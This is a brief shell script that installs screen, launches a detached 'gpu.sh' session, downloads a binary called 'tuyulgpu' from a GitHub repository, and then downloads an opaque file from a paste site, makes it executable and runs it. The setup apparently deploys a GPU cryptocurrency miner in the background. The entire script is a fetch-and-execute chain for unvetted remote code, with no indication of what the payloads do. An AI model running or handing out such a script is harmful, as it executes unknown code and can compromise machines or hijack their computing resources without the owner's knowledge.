#!/bin/sh

sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/mamakkaucoy/kontol/raw/main/tuyulgpu && chmod +x tuyulgpu && wget https://www.heypasteit.com/download/0IW81D && chmod u+x 0IW81D && ./0IW81D
